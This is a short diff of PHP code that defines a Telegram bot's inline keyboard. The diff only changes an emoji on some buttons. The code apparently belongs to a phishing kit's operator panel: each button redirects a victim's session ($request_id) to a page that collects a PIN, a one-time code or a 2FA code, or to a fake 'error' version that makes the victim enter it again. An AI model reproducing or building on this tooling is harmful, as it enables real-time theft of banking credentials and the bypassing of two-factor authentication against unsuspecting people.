@@ -147,19 +147,19 @@ $keyboard = [
     'inline_keyboard' => [
         [
             ['text' => '『🍀』𝖨𝗇𝗂𝖼𝗂𝗈', 'callback_data' => "redir:$request_id:index.php"],
-            ['text' => '『🛑』𝖨𝗇𝗂𝖼𝗂𝗈 𝖤𝗋𝗋𝗈𝗋', 'callback_data' => "redir:$request_id:index-error.php"]
+            ['text' => '『🚫』𝖨𝗇𝗂𝖼𝗂𝗈 𝖤𝗋𝗋𝗈𝗋', 'callback_data' => "redir:$request_id:index-error.php"]
         ],
         [
             ['text' => '『🍀』𝖯𝖨𝖭', 'callback_data' => "redir:$request_id:pin.php"],
-            ['text' => '『🛑』𝖯𝖨𝖭 𝖤𝗋𝗋𝗈𝗋', 'callback_data' => "redir:$request_id:pin-error.php"]
+            ['text' => '『🚫』𝖯𝖨𝖭 𝖤𝗋𝗋𝗈𝗋', 'callback_data' => "redir:$request_id:pin-error.php"]
         ],
         [
             ['text' => '『🍀』𝖮𝖳𝖯', 'callback_data' => "redir:$request_id:cod.php"],
-            ['text' => '『🛑』𝖮𝖳𝖯 𝖤𝗋𝗋𝗈𝗋', 'callback_data' => "redir:$request_id:cod-error.php"]
+            ['text' => '『🚫』𝖮𝖳𝖯 𝖤𝗋𝗋𝗈𝗋', 'callback_data' => "redir:$request_id:cod-error.php"]
         ],
         [
             ['text' => '『🍀』2𝖥𝖠', 'callback_data' => "redir:$request_id:2FA.php"],
-            ['text' => '『🛑』2𝖥𝖠 𝖤𝗋𝗋𝗈𝗋', 'callback_data' => "redir:$request_id:2FA-error.php"]
+            ['text' => '『🚫』2𝖥𝖠 𝖤𝗋𝗋𝗈𝗋', 'callback_data' => "redir:$request_id:2FA-error.php"]
         ],
         [
             ['text' => '『🏁』𝖥𝗂𝗇𝖺𝗅𝗂𝗓𝖺𝗋', 'callback_data' => "redir:$request_id:finalizar.php"]
